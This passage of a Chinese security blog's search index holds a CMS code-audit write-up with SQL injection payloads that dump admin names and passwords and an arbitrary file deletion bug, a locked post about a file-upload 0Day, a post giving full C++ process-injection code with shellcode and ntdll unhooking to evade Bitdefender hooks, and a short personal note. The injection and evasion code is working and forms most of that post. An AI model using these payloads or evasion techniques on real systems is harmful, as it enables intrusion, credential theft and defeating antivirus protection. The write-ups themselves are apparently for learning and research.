class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261548997.png" alt="image-20230726154808924"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取admin字段信息</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;),(&#x27;</span><span class="string">&#x27;, &#x27;</span><span class="number">6</span><span class="string">&#x27;,&#x27;</span><span class="number">0</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span><span class="string">&#x27;,&#x27;</span><span class="number">6</span><span class="string">&#x27;,(select group_concat(admin_name,0x3a, pwd) from blue_admin),&#x27;</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="string">&#x27;,&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261550017.png" alt="image-20230726155024940"></p><h4 id="7、任意文件删除"><a href="#7、任意文件删除" class="headerlink" title="7、任意文件删除"></a>7、任意文件删除</h4><p>漏洞点: <code>user.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$act</span> == <span class="string">&#x27;edit_user_info&#x27;</span>)&#123;</span><br><span class="line"> <span class="variable">$user_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user_id&#x27;</span>]);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$user_id</span>))&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$birthday</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;birthday&#x27;</span>]);</span><br><span class="line"><span class="variable">$sex</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sex&#x27;</span>]);</span><br><span class="line">   <span class="variable">$email</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$msn</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msn&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;msn&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$qq</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qq&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qq&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$mobile_phone</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mobile_phone&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;mobile_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$office_phone</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;office_phone&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;office_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">   <span class="variable">$home_phone</span>   = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;home_phone&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;home_phone&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$address</span> = !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]) ? <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic1&#x27;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic1&#x27;</span>], <span class="string">&#x27;http://&#x27;</span>) != <span class="literal">false</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic1&#x27;</span>], <span class="string">&#x27;https://&#x27;</span>) != <span class="literal">false</span>)&#123;</span><br><span class="line">          <span class="title function_ invoke__">showmsg</span>(<span class="string">&#x27;只支持本站相对路径地址&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$face_pic</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic1&#x27;</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(BLUE_ROOT.<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic3&#x27;</span>]))&#123;</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(BLUE_ROOT.<span class="variable">$_POST</span>[<span class="string">&#x27;face_pic3&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>edit_user_info</code> 更新个人信息中，直接调用 unlink 函数删除 <code>$_POST[&#39;face_pic3&#39;]</code>，没有进行相应的检查，导致任意文件删除漏洞</p><p>访问 <code>user.php</code> 并且抓包修改<code>act=edit_user_info</code>  ，post添加 <code>face_pic3</code> 成功删除根目录下的flag.txt</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261619560.png" alt="image-20230726161909476"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>第一次做CMS代码审计，感觉这套CMS还有很多洞，但是这里没有继续深挖了，自己对PHP的知识还是有点不够，有些代码逻辑还得问问神奇的GPT，之前的PHP知识并不足以支持我审计一套CMS，还得继续学习下PHP相关的知识</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某后台管理系统任意文件上传0Day</title>
      <link href="/2023/07/16/%E6%9F%90%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A00Day/"/>
      <url>/2023/07/16/%E6%9F%90%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A00Day/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="不知道密码你看啥." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="db633090fb1145b1fca0634b125cbb9b22843720baaabc23e6b6e66b02e54872">92aa9bd1b795b44ed0b8aaf72b1071e409f845bd2da94090569a6f872922ec7951a9607cfb792b0e3ffe027b21368751dc3538344ddbe2e5a295b3e6c192581a4dbcf73a66edbedaad7545954d1e8d4756cd8899ce63de4a47b070bb6957ace15f80b287571bcf2eb286ca98840c17bfb40ba3b712ae6bdecd867bacec3305ea4d2b8f4ecbe73edabbc6fc834cd7da459432ef1d29650b907095cd347ed8d6c4c63fe87e154b339c329bfe44280f1dba3ad3b09b0f18cb247b3b2b9317d6cb8fb3e845acafbaab9be585781a78d3073745f4fc64a91d253e50725827bd5b98490283a0d3749c33085a642975c3befc756243eff209e4b8f6465066a33a6ad25861c20d1bbccc073967bd91d8c53eefda8392e9ce0979e1ffd36fa73ae0dd1962ab1f3584f6607b7aa4d5f9713f2b9538317f6bd8290a00101253a2451107956eb22607a556acb9699352a67feaa379396041d011bcde644bb747daf6e54015a218d2c5cfe1593f7d334a5c57e8e8839721b272b87e152abe32c6041ad0b7733e1ea035a1e3d6b0caf94f62bec7aed351aaa002674d1ccec4c3f1787d81695dff8332770b2cc4a0f516cc26f9747f88c67c3deed454f4e0af18fe0adeb60e5341ce0ac8c4627ec72ef70a2ddd8af18fe0310b3213bcdc8e51fb2aabc0283c7f56b5e29df3b47c788da8045ac6b263298daa49c2dca0dc3c02eb1b1b3bf69f253fb20b41ca925d0eff245ce934fdc9eac3e3ec5c281ec3a5051891d5e1e85de58e6b1db17ba2aa56d5e0a32102ac372fb97c0101e89b1d2915264be8e2b4f42d43fd2849a215831832bd1d1a6c09977c536f2537f4d7b9bbb8039d3747d5ccafa18180aad8d3d34a955f3bf2f93ddf3540ecbd6e79aae02aacda5398394dfb855c9c7b74a900c045d8d477f1a606901a152129b696edf305e191edbea808f93b7214f00cd3e80714a8bc411047327c142bb118f7afb2e47827f40b8fa5f2b3ebf3e6f4c7b32ca471fa1f8798ae9c08fd75c453cf2012afb7533c0a3b5f0de9587b81d9d3de9c45d68f1aee6d0cf5b444b6a8522889e5b1512fc2341048b620f1d8e3dcbdaff9072d91555f18debd175aba2f4f662eea5673418a50a296880cfdbfd839caa4a381981fa329af1f6a4ae3f41a7f9e58ab299b9a7123b5330541c0ffc7341469d67268aeccf63688518ef58649aab58cca79f5eb73f139c458302a46295cc129b862c0be937d01a7918d73cc39a22c5f9c361c768ff03a2250e6afa52546c571930081ef041b6cdeb91ce57e9df5407a9cd768a419b861755686c8417dcf1a0403ebc851a6f7a9df94bae93f03db4f9617b31e07c3a290b8ccd979a8e3e542179d06b898bf04d0d835065b741e587f75d0178e73b750d7597afc741c95b64da577a4a5184f2d875a465831c67c88121171f65b49b561eb279578f24786521d1f9c6d3b348c7a917c21790f71b2e6fedaf5a646cdd223db90fb213b4f21add36a8f188964cab0723bf5096e32a6441d3878696ae216d865a799fd47e0ca98adb26c98484a96f4329c41ecba6b18f9867e19f552650916b84f3038fade912af1c15d51db5eeffedd08cc7723f63a04fe78ceb20adfe024ed983eb6579ca52d10759a2dc46a8064ac81ba5ca88dbfd51a74754958cf17c815fc6be70e38766e6c4f984c87faf27534496cf0205c4fdfcb1efe09335d1e1bbcd7944471e43311b73ace93cf4f2de9b7946a6dd7f2dc8ff367952f35b97c6317982080140e458bd32dcea159257b3b923dfd86e16226045875ff28575294d73ddb674a5283</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码查看.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> 0Day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从ring3绕过AV hook</title>
      <link href="/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/"/>
      <url>/2023/07/12/%E4%BB%8Ering3%E7%BB%95%E8%BF%87AV%20hook/</url>
      
        <content type="html"><![CDATA[<h4 id="0x1、前言"><a href="#0x1、前言" class="headerlink" title="0x1、前言"></a>0x1、前言</h4><p><strong>ntdll.dll常常是被AV&#x2F;EDR hook的主要模块，当程序完全加载完毕后，我们可以尝试从system32目录下加载一个干净的ntdll.dll。</strong></p><ol><li>将 ntdll.dll 的新副本从磁盘映射到进程内存</li><li>查找挂钩的 ntdll.dll 的 .text 部分的虚拟地址</li><li>获取 ntdll.dll 基地址</li><li>模块基址 + 模块的 .text 部分 VirtualAddress</li><li>查找新映射的 ntdll.dll 的 .text 部分的虚拟地址</li><li>获取挂钩模块的 .text 部分的原始内存保护</li><li>将 .text 部分从新映射的 dll 复制到原始（挂钩的）ntdll.dll 的虚拟地址（在第 3 步中找到）——这是取消挂钩的主要部分，因为所有挂钩的字节都被磁盘中的新字节覆盖</li><li>将原始内存保护应用到原始 ntdll.dll 的刚脱钩的 .text 部分</li></ol><h4 id="0x2、分析"><a href="#0x2、分析" class="headerlink" title="0x2、分析"></a>0x2、分析</h4><p>这里使用常规进程注入代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">FindPid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HANDLE         hProcessSnap = <span class="literal">NULL</span>;</span><br><span class="line">    BOOL           bRet = FALSE;</span><br><span class="line">    PROCESSENTRY32 pe32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD dwProcessId;</span><br><span class="line">    hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="literal">NULL</span>);</span><br><span class="line">    pe32.dwSize = <span class="built_in">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap != INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        bRet = <span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">        <span class="keyword">while</span> (bRet) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_wcsicmp(pe32.szExeFile, <span class="string">L&quot;notepad.exe&quot;</span>)) &#123;</span><br><span class="line">                dwProcessId = pe32.th32ProcessID;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            bRet = <span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwProcessId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">INject</span><span class="params">(DWORD pid)</span> </span>&#123;</span><br><span class="line">    HANDLE processHandle;</span><br><span class="line">    HANDLE remoteThread;</span><br><span class="line">    PVOID remoteBuffer;</span><br><span class="line">    <span class="comment">//x64 calc shellcode</span></span><br><span class="line">    UCHAR buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">    processHandle = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    remoteBuffer = <span class="built_in">VirtualAllocEx</span>(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(processHandle, remoteBuffer, buf, <span class="keyword">sizeof</span> buf, <span class="literal">NULL</span>);</span><br><span class="line">    remoteThread = <span class="built_in">CreateRemoteThread</span>(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)remoteBuffer, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (remoteThread) &#123;</span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(remoteThread, <span class="number">500</span>);</span><br><span class="line">        <span class="built_in">CloseHandle</span>(remoteThread);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(processHandle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DWORD pid = <span class="built_in">FindPid</span>();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Find notepad pid : %d\n&quot;</span>, pid);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">INject</span>(pid);</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在无AV环境下正常程序执行DLL加载过程</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121705011.png" alt="image-20230712170555905"></p><p>这时候查看ntdll.dll中的函数是干净的</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121706233.png" alt="image-20230712170633172"></p><p>我们在AV环境下调试程序的时候，杀软会自动加载dll</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121741494.png" alt="image-20230712174120435"></p><p>查看ntdll中的函数，这时候ntdll.dll已经被bitdefender给hook了</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121741109.png" alt="image-20230712174150045"></p><p>由于ntdll.dll在ring3层被hook了，我们如果想要绕过他的hook，就只用重新将一个干净的ntdll.dll加载一次，来绕过ring3的hook，下列是unhook代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">UNHOOKntdll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MODULEINFO Nt = &#123;&#125;;</span><br><span class="line">    HMODULE ntdllModule = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetModuleInformation</span>(<span class="built_in">HANDLE</span>(<span class="number">-1</span>), ntdllModule, &amp;Nt, <span class="built_in">sizeof</span>(Nt));</span><br><span class="line">    LPVOID ntdllBase = (LPVOID)Nt.lpBaseOfDll;</span><br><span class="line">    HANDLE ntdllFile = <span class="built_in">CreateFileA</span>(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE ntdllMapping = <span class="built_in">CreateFileMapping</span>(ntdllFile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    LPVOID ntdllMappingAddress = <span class="built_in">MapViewOfFile</span>(ntdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;</span><br><span class="line">    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; hookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)<span class="built_in">IMAGE_FIRST_SECTION</span>(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">char</span>*)hookedSectionHeader-&gt;Name, (<span class="type">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">            DWORD oldProtection = <span class="number">0</span>;</span><br><span class="line">            <span class="type">bool</span> isProtected = <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">            <span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">            isProtected = <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(ntdllFile);</span><br><span class="line">    <span class="built_in">CloseHandle</span>(ntdllMapping);</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(ntdllModule);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x3、实验"><a href="#0x3、实验" class="headerlink" title="0x3、实验"></a>0x3、实验</h4><p>使用普通注入情况下，直接检测到注入，立刻就被干掉了。</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121754781.png" alt="image-20230712175437731"></p><p>使用reload ntdll.dll，直接将hook移除</p><p>移除前ntdll.dll还是被AV hook中</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121931281.png" alt="image-20230712193135222"></p><p>移除后hook后在检查时发现ntdll.dll已经干净了<img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121929662.png" alt="image-20230712192927602"></p><p>绕过bitdefender注入到notepad中执行shellcode</p><p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307121959377.png" alt="image-20230712195927319"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>兜兜转转又从头开始</title>
      <link href="/2023/07/11/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B/"/>
      <url>/2023/07/11/%E4%BB%8E%E5%A4%B4%E5%BC%80%E5%A7%8B/</url>
      
        <content type="html"><![CDATA[<p><strong>2018年的时候搭建了第一个blog，写了一段时间后又觉得不方便，在2019年底的时候转到了公众号，在校期间写了两年好像也就产出了9篇文章(水得一P)，工作后发现，还是得把blog给弄起来，唉，兜兜转转又回到了最初的起点。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
